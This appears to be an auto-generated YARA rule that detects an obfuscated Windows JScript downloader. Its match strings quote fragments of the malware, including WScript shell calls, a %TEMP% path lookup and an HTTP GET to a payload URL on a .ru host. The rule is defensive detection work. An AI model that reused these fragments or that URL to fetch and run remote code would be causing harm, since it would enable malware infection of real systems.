rule sig_20160428_1c05edaeccf2c1b4a90f6fa8cf6625c0 {
  meta:
    description = "datamaliciousorder - file 20160428_1c05edaeccf2c1b4a90f6fa8cf6625c0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3b3cb2bd515679b43f4809226b56417f8f0d70e95706d68dbbb0b5a80015a583"

  strings:
    $s1  = "function ToeMsoLwwFelGfoObsFra() {return QpnOzhRjuQndNamWhxRff[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function YdoMbwDsdNnxZgsDznPlk(IimWboGylHtvNrrPesRkd){QpnOzhRjuQndNamWhxRff[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "var QpnOzhRjuQndNamWhxRff = function KehKrdGihBvgGriPndLvv() {return FemDqpSmiYqhCvhHnoExs[QjtUzhLioFekRecXjeVdf](\"WScript\"+\"" ascii
    $s4  = "BkuBnyPzcJswXviPewQnv[GqcXqrIwzHbxGcqNlkSuk](\"G\" + \"ET\", \"http://alex-naumov.ru/j8skdwq\", false);" fullword ascii
    $s5  = "var FemDqpSmiYqhCvhHnoExs = this[\"WScript\"];" fullword ascii
    $s6  = "var QpnOzhRjuQndNamWhxRff = function KehKrdGihBvgGriPndLvv() {return FemDqpSmiYqhCvhHnoExs[QjtUzhLioFekRecXjeVdf](\"WScript\"+\"" ascii
    $s7  = "function YdoMbwDsdNnxZgsDznPlk(IimWboGylHtvNrrPesRkd){QpnOzhRjuQndNamWhxRff[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "function ToeMsoLwwFelGfoObsFra() {return QpnOzhRjuQndNamWhxRff[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function HbeDufWkcMbgQbpPznApu(DgwMwjKsxScaVelLsmZfy, JtlFfcJfoMvzKrvUpfKvp){XscAazVodSwhKqnSuqNge = XscAazVodSwhKqnSuqNge * 1; " ascii
    $s10 = "function VbwLgzAfjNhwGseButXup(){return CtkXyiYflNhzShdMmrLbu + \"\";};" fullword ascii
    $s11 = "return DgwMwjKsxScaVelLsmZfy - JtlFfcJfoMvzKrvUpfKvp;};" fullword ascii
    $s12 = "if (BkuBnyPzcJswXviPewQnv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function OnxRuoThxAglKpcYgsQgs() {return ((AarHfsRfrStiYjcGoyPhu == true) && (AarHfsRfrStiYjcGoyPhu == KjuKqjOhmRwbTijOfoXli)) ?" ascii
    $s14 = "var AarHfsRfrStiYjcGoyPhu = false;" fullword ascii
    $s15 = "var KjuKqjOhmRwbTijOfoXli = false;" fullword ascii
    $s16 = "XgeKoyEpfIihCfaGldYvq = true;" fullword ascii
    $s17 = "function XblSsvFhoQabUumFswWyo(){return QjtUzhLioFekRecXjeVdf;};" fullword ascii
    $s18 = "var FjbDanLdqCswGbbDmsExq = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function MkpDrdOukZraAmpTvsGhv()" fullword ascii
    $s20 = "}while (ArnRdaSapRydGqsWmsErf);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}